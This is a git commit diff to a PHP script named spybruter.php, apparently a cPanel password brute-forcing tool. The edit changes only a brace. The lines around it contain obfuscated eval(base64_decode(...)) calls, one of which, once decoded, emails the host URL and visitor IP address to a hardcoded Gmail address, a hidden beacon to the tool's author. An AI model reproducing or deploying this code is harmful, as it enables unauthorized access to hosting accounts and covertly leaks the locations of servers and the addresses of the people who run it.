8caa3c7b970a37e596c8dc6a75ddac52082e6f39
kalix-Ru <66873143+kalix-Ru@users.noreply.github.com>
2022-01-15 13:23:26 +0100

    Update spybruter.php

--- spybruter.php
+++ spybruter.php
@@ -399,7 +399,7 @@ eval(base64_decode($Getconfig));
 			echo "<hr><b>You Found <font color=green>$ok</font> cPanel (1962Cracker)</b>";
 			exit;
 	}
-	}
+	};
 
 eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
  ?>
